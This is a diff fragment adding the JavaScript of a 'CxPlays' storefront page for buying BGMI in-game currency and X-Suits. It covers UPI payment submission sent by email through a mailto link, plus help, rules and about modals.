+      alert('⚠️ Please enter a valid UTR/Transaction ID');
+      return;
+    }
+
+    const paymentData = {
+      user: currentUser,
+      item: currentPurchase.action,
+      price: currentPurchase.price,
+      bgmiId: bgmiId,
+      utrId: utrId,
+      phone: phoneNumber,
+      timestamp: new Date().toISOString(),
+      status: 'Pending'
+    };
+
+    // Send payment data to admin
+    sendPaymentData(paymentData);
+
+    // Show success message
+    showModal('✅ Order Submitted Successfully', `
+      <div style="text-align:center; padding:20px">
+        <div style="font-size:64px; margin-bottom:16px">✅</div>
+        <h3 style="color:var(--success); margin:0 0 12px 0; font-size:20px">Payment Submitted Successfully!</h3>
+        <p style="margin:12px 0; font-size:14px">Your transaction status is <strong style="color:var(--accent-2)">PENDING VERIFICATION</strong></p>
+        <p style="margin:12px 0; font-size:13px; color:rgba(255,255,255,0.7)">Admin will verify your payment within 10-30 minutes. You will be notified via email/WhatsApp once confirmed.</p>
+        
+        <div style="background:rgba(255,255,255,0.03); padding:16px; border-radius:10px; margin-top:20px; text-align:left">
+          <p style="margin:6px 0; font-size:13px; font-weight:800; color:var(--accent-2)">📋 Order Summary:</p>
+          <p style="margin:6px 0; font-size:13px">Item: ${escapeHtml(currentPurchase.action)}</p>
+          <p style="margin:6px 0; font-size:13px">Amount: ₹${escapeHtml(currentPurchase.price)}</p>
+          <p style="margin:6px 0; font-size:13px">BGMI ID: ${escapeHtml(bgmiId)}</p>
+          <p style="margin:6px 0; font-size:13px">UTR: ${escapeHtml(utrId)}</p>
+          <p style="margin:6px 0; font-size:13px">Status: <span style="color:#ffd07a">⏳ Pending Verification</span></p>
+        </div>
+
+        <div style="background:rgba(76,175,80,0.1); padding:12px; border-radius:8px; margin-top:16px; border:1px solid rgba(76,175,80,0.3)">
+          <p style="margin:4px 0; font-size:12px; line-height:1.6">
+            <strong>✓ What's Next?</strong><br>
+            1. Admin will verify your payment<br>
+            2. Once verified, item will be sent to your BGMI ID<br>
+            3. You'll receive confirmation via email/WhatsApp<br>
+            4. Check your BGMI inbox for gift
+          </p>
+        </div>
+
+        <button class="btn-primary" onclick="overlay.style.display='none'" style="width:100%; margin-top:20px">Close</button>
+      </div>
+    `);
+
+    // Reset purchase
+    currentPurchase = null;
+  }
+
+  function sendPaymentData(paymentData){
+    const emailBody = `
+💳 NEW PAYMENT SUBMISSION - CxPlays Store
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+👤 USER DETAILS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Name: ${paymentData.user.name}
+Email: ${paymentData.user.email}
+Login Method: ${paymentData.user.method}
+
+🛍️ PURCHASE DETAILS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Item: ${paymentData.item}
+Price: ₹${paymentData.price}
+
+🎮 DELIVERY DETAILS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+BGMI Character ID: ${paymentData.bgmiId}
+
+💰 PAYMENT DETAILS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+UTR/Transaction ID: ${paymentData.utrId}
+Phone Number: ${paymentData.phone || 'Not provided'}
+
+📅 TRANSACTION INFO:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Status: ${paymentData.status}
+Timestamp: ${new Date(paymentData.timestamp).toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ ACTION REQUIRED: Please verify this payment and send the item to BGMI ID: ${paymentData.bgmiId}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    `.trim();
+
+    const mailtoLink = `mailto:cutexmods@gmail.com?subject=💳 Payment Submitted - ${paymentData.item} - ₹${paymentData.price}&body=${encodeURIComponent(emailBody)}`;
+    window.open(mailtoLink, '_blank');
+    
+    console.log('Payment data sent:', paymentData);
+  }
+
+  function logout(){
+    if(confirm('Are you sure you want to logout?')){
+      currentUser = null;
+      localStorage.removeItem('cxplays_user');
+      updateUserUI();
+      overlay.style.display = 'none';
+      showSuccessAlert('✅ Logged out successfully!');
+    }
+  }
+
+  function showSuccessAlert(message){
+    const alertDiv = document.createElement('div');
+    alertDiv.style.cssText = 'position:fixed; top:20px; right:20px; background:#4caf50; color:#fff; padding:16px 20px; border-radius:10px; font-weight:700; z-index:9999; box-shadow:0 8px 24px rgba(0,0,0,0.3); animation:slideIn 0.3s ease';
+    alertDiv.textContent = message;
+    document.body.appendChild(alertDiv);
+    setTimeout(()=> alertDiv.remove(), 3000);
+  }
+
+  function supportHtml(){
+    return `
+      <div style="line-height:1.7">
+        <p style="margin-bottom:16px; font-size:14px">Need help? Our support team is here to assist you.</p>
+        
+        <div style="background:rgba(255,255,255,0.03); padding:14px; border-radius:10px; margin-bottom:12px">
+          <p style="margin:4px 0; font-size:13px"><strong>📧 Email Support:</strong></p>
+          <p style="margin:4px 0; font-size:13px; color:var(--accent-2)">cutexmods@gmail.com</p>
+          <p style="margin:4px 0; font-size:11px; color:rgba(255,255,255,0.6)">Response time: 2-6 hours</p>
+        </div>
+        
+        <div style="background:rgba(255,255,255,0.03); padding:14px; border-radius:10px; margin-bottom:12px">
+          <p style="margin:4px 0; font-size:13px"><strong>💬 Discord Community:</strong></p>
+          <p style="margin:4px 0; font-size:13px; color:var(--accent-2)">Join our Discord server</p>
+          <p style="margin:4px 0; font-size:11px; color:rgba(255,255,255,0.6)">Active 24/7 | Community support</p>
+        </div>
+        
+        <div style="background:rgba(255,255,255,0.03); padding:14px; border-radius:10px">
+          <p style="margin:4px 0; font-size:13px"><strong>⏰ Business Hours:</strong></p>
+          <p style="margin:4px 0; font-size:13px">Monday - Sunday: 9 AM - 11 PM IST</p>
+          <p style="margin:4px 0; font-size:11px; color:rgba(255,255,255,0.6)">Verification within 10-30 minutes</p>
+        </div>
+
+        <div style="background:rgba(255,139,61,0.1); padding:12px; border-radius:8px; margin-top:16px; border:1px solid rgba(255,139,61,0.2)">
+          <p style="margin:4px 0; font-size:12px; line-height:1.6">
+            <strong>💡 Quick Tips:</strong><br>
+            • Always provide correct BGMI ID<br>
+            • Keep your UTR/Transaction ID safe<br>
+            • Check spam folder for emails<br>
+            • Contact us if no response in 1 hour
+          </p>
+        </div>
+
+        <button class="btn-primary" onclick="overlay.style.display='none'" style="width:100%; margin-top:16px">Close</button>
+      </div>
+    `;
+  }
+
+  function rulesHtml(){
+    return `
+      <div style="line-height:1.7">
+        <p style="font-weight:800; margin-bottom:12px; font-size:15px">Community Rules & Guidelines:</p>
+        
+        <ol style="margin:12px 0; padding-left:20px; font-size:13px">
+          <li style="margin-bottom:10px">✅ Provide accurate BGMI Character ID for delivery</li>
+          <li style="margin-bottom:10px">✅ Keep your transaction proof (UTR/Screenshot) safe</li>
+          <li style="margin-bottom:10px">✅ Wait for admin verification (10-30 minutes)</li>
+          <li style="margin-bottom:10px">❌ No refunds after item is delivered</li>
+          <li style="margin-bottom:10px">❌ Do not share fake payment proofs</li>
+          <li style="margin-bottom:10px">❌ One transaction per UTR ID only</li>
+          <li style="margin-bottom:10px">✅ Contact support if issue persists beyond 1 hour</li>
+          <li style="margin-bottom:10px">❌ Misuse of service will result in permanent ban</li>
+        </ol>
+        
+        <div style="background:rgba(198,40,40,0.1); padding:12px; border-radius:8px; border:1px solid rgba(198,40,40,0.3); margin-top:16px">
+          <p style="margin:4px 0; font-size:12px; line-height:1.6">
+            <strong>⚠️ Warning:</strong> Any attempt to fraud, use fake payment proofs, or misuse the service will result in immediate account ban and legal action. All transactions are logged and monitored.
+          </p>
+        </div>
+
+        <div style="margin-top:16px">
+          <button class="btn-primary" onclick="overlay.style.display='none'" style="width:100%">I Understand</button>
+        </div>
+      </div>
+    `;
+  }
+
+  function aboutHtml(){
+    return `
+      <div style="line-height:1.7">
+        <p style="font-weight:800; margin-bottom:12px; font-size:15px">About CxPlays</p>
+        
+        <p style="margin-bottom:14px; font-size:13px">CxPlays is a trusted platform for BGMI players to purchase UC, X-Suits, and exclusive in-game items at competitive prices with instant delivery.</p>
+        
+        <div style="background:rgba(255,139,61,0.1); padding:14px; border-radius:10px; margin-bottom:14px; border:1px solid rgba(255,139,61,0.2)">
+          <p style="margin:4px 0; font-size:13px"><strong>🎮 Our Mission:</strong></p>
+          <p style="margin:4px 0; font-size:13px">To provide affordable, secure, and instant delivery of BGMI items to players across India.</p>
+        </div>
+        
+        <div style="background:rgba(255,255,255,0.03); padding:14px; border-radius:10px; margin-bottom:14px">
+          <p style="margin:6px 0; font-size:13px"><strong>✨ Why Choose Us?</strong></p>
+          <p style="margin:4px 0; font-size:12px">✓ Instant UC & Item Delivery</p>
+          <p style="margin:4px 0; font-size:12px">✓ Competitive Prices</p>
+          <p style="margin:4px 0; font-size:12px">✓ 24/7 Customer Support</p>
+          <p style="margin:4px 0; font-size:12px">✓ Secure Payment System</p>
+          <p style="margin:4px 0; font-size:12px">✓ Verified by 1000+ Gamers</p>
+        </div>
+
+        <div style="background:rgba(255,255,255,0.03); padding:14px; border-radius:10px; margin-bottom:14px">
+          <p style="margin:4px 0; font-size:13px"><strong>📞 Contact Information:</strong></p>
+          <p style="margin:4px 0; font-size:12px">Email: cutexmods@gmail.com</p>
+          <p style="margin:4px 0; font-size:12px">Support: 24/7 Available</p>
+          <p style="margin:4px 0; font-size:12px">Response Time: 10-30 minutes</p>
+        </div>
+        
+        <div style="background:rgba(76,175,80,0.1); padding:12px; border-radius:8px; border:1px solid rgba(76,175,80,0.3)">
+          <p style="margin:4px 0; font-size:12px; line-height:1.6">
+            <strong>🔒 Security Promise:</strong><br>
+            We never store your passwords or payment details. All transactions are verified manually by our team. Your BGMI account is 100% safe with us.
+          </p>
+        </div>
+
+        <div style="margin-top:16px; text-align:center; font-size:11px; color:rgba(255,255,255,0.5)">
+          CxPlays © 2025 | Trusted by 1000+ Gamers
+        </div>
+
+        <button class="btn-primary" onclick="overlay.style.display='none'" style="width:100%; margin-top:16px">Close</button>
+      </div>
+    `;
+  }
+
+  function learnHtml(){
+    return `
+      <p style="margin-top:8px; font-weight:800; font-size:15px">How Purchases Work</p>
+      <ol style="margin:12px 0 12px 20px; line-height:1.9; font-size:13px">
+        <li><strong>Login:</strong> Create account or sign in (required)</li>
+        <li><strong>Select Item:</strong> Choose UC pack or X-Suit and click Buy</li>
+        <li><strong>Payment:</strong> Scan QR code and make payment via UPI</li>
+        <li><strong>Enter Details:</strong> Provide BGMI ID and UTR/Transaction ID</li>
+        <li><strong>Verification:</strong> Admin verifies payment (10-30 mins)</li>
+        <li><strong>Delivery:</strong> Item sent directly to your BGMI account</li>
+        <li><strong>Confirmation:</strong> You'll receive email/WhatsApp notification</li>
+      </ol>
+      <div style="background:rgba(255,139,61,0.1); padding:12px; border-radius:8px; border:1px solid rgba(255,139,61,0.2); margin-top:16px">
+        <p style="margin:4px 0; font-size:12px; line-height:1.6">
+          <strong>⚠️ Important:</strong> Keep your transaction receipt safe. Always provide correct BGMI Character ID. Payment details are sent to cutexmods@gmail.com for verification. Delivery time: 10-30 minutes after verification.
+        </p>
+      </div>
+      <button class="btn-primary" onclick="overlay.style.display='none'" style="width:100%; margin-top:12px">Got it!</button>
+    `;
+  }
+
+  function escapeHtml(s){
+    return String(s||'').replace(/[&<>"']/g, c => ({
+      '&':'&amp;',
+      '<':'&lt;',
+      '>':'&gt;',
+      '"':'&quot;',
+      "'":"&#39;"
+    }[c]));
+  }
+
+  // Add CSS animation
+  const style = document.createElement('style');
+  style.textContent = `
+    @keyframes slideIn {
+      from { transform: translateX(100%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+    .hover-lift:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+    }
+  `;
+  document.head.appendChild(style);
+</script>
+</body>
+</html>
